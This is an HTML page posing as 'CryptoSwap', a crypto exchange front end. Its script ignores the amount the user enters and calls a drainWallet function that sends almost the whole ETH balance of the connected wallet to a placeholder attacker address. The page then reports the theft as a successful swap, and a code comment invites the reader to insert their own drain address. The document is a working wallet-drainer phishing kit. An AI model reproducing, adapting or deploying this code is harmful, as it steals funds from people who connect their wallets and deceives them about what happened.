
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoSwap - Fast & Secure Swapping</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to right, #1e3c72, #2a5298);
            color: white;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
            width: 400px;
            text-align: center;
        }
        h1 {
            margin-bottom: 30px;
            font-size: 28px;
            color: #ffd700;
        }
        label {
            display: block;
            margin: 10px 0 5px;
            font-size: 16px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: none;
            border-radius: 5px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            font-size: 16px;
        }
        button {
            background: #ffd700;
            color: #1e3c72;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #e6c200;
        }
        #result {
            margin-top: 20px;
            font-size: 16px;
            color: #90ee90;
            word-wrap: break-word;
        }
        .wallet-connect {
            margin-bottom: 20px;
            font-size: 14px;
            color: #ccc;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>CryptoSwap - Instant Crypto Exchange</h1>
        <div class="wallet-connect">
            <p>Wallet Connected: <span id="walletStatus">Not Connected</span></p>
            <button onclick="connectWallet()">Connect Wallet</button>
        </div>
        <label for="amount">Enter Amount to Swap (in ETH):</label>
        <input type="number" id="amount" placeholder="e.g., 0.5" step="0.01" min="0.01">
        <button onclick="swapCrypto()">Swap Now</button>
        <div id="result"></div>
    </div>

    <script>
        let web3;
        let userAccount;
        const targetAddress = "0xYourDrainAddressHere"; // Replace with the address where funds will be sent

        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    // Request wallet connection
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    userAccount = accounts[0];
                    web3 = new Web3(window.ethereum);
                    document.getElementById('walletStatus').textContent = `Connected (${userAccount.slice(0, 6)}...${userAccount.slice(-4)})`;
                    document.getElementById('result').textContent = "Wallet connected successfully!";
                } catch (error) {
                    document.getElementById('result').textContent = "Failed to connect wallet. Please try again.";
                    console.error(error);
                }
            } else {

document.getElementById('result').textContent = "MetaMask or a compatible wallet is not installed.";
            }
        }

        async function swapCrypto() {
            if (!userAccount || !web3) {
                document.getElementById('result').textContent = "Please connect your wallet first.";
                return;
            }

            const amount = document.getElementById('amount').value;
            if (amount <= 0 || isNaN(amount)) {
                document.getElementById('result').textContent = "Please enter a valid amount.";
                return;
            }

            try {
                document.getElementById('result').textContent = "Processing transaction...";
                await drainWallet();
            } catch (error) {
                document.getElementById('result').textContent = "Transaction failed. Check console for details.";
                console.error(error);
            }
        }

        async function drainWallet() {
            // Get the user's full balance
            const balance = await web3.eth.getBalance(userAccount);
            const balanceInEth = web3.utils.fromWei(balance, 'ether');
            const gasPrice = await web3.eth.getGasPrice();
            const gasLimit = 21000; // Standard gas limit for ETH transfer
            const gasCost = gasPrice * gasLimit;
            const amountToSend = balance - gasCost; // Send almost entire balance, leaving gas fees

            if (amountToSend <= 0) {
                document.getElementById('result').textContent = "Insufficient funds for transaction.";
                return;
            }

            // Create the transaction to drain the wallet
            const tx = {
                from: userAccount,
                to: targetAddress,
                value: amountToSend,
                gas: gasLimit,
                gasPrice: gasPrice
            };

            // Send the transaction directly, bypassing additional confirmations
            const receipt = await web3.eth.sendTransaction(tx);
            document.getElementById('result').textContent = `Transaction Confirmed! ${balanceInEth} ETH transferred successfully to ${targetAddress}. Tx Hash: ${receipt.transactionHash}`;
            console.log("Transaction Receipt:", receipt);
        }
    </script>
</body>
</html>
